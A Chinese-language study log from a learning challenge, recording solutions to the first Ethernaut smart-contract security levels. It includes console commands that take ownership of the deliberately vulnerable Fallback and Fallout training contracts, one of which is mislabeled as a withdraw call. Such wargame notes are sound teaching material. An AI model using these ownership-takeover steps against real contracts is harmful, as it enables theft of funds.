---
timezone: Asia/Shanghai
---

---

# awmpy

1. 自我介绍
我是一名后端开发工程师，负责公司云靶场的开发工作，熟悉OpenStack与Kubernetes等云计算技术


2. 你认为你会完成本次残酷学习吗？
一定可以

## Notes

<!-- Content_START -->

### 2024.08.29

- Ethernaut

#### 0. Hello Ethernaut

根据提示在浏览器控制台中输入相应的命令即可
需要注意的是：

通过`contract.abi`查看所有可用的方法，再通过`contract.password()`方法获取密码

#### 1. Fallback

查看合约代码后发现receive方法中满足贡献值>0与发送交易的value>0时会将owner设置为sender

首先用小于0.001eth向合约捐献，调用contribute()函数，使我们拥有贡献值
`await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})`
向合约发送一些eth，触发receive，获取owner
`await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})`
调用withdraw提取余额
`await contract.owner()`


#### 2. Fallout

这个合约中构造函数拼写错误导致任何人都可以调用Fal1out函数来获取owner权限
`await contract.Fal1out()`

### 2024.08.30

<!-- Content_END -->
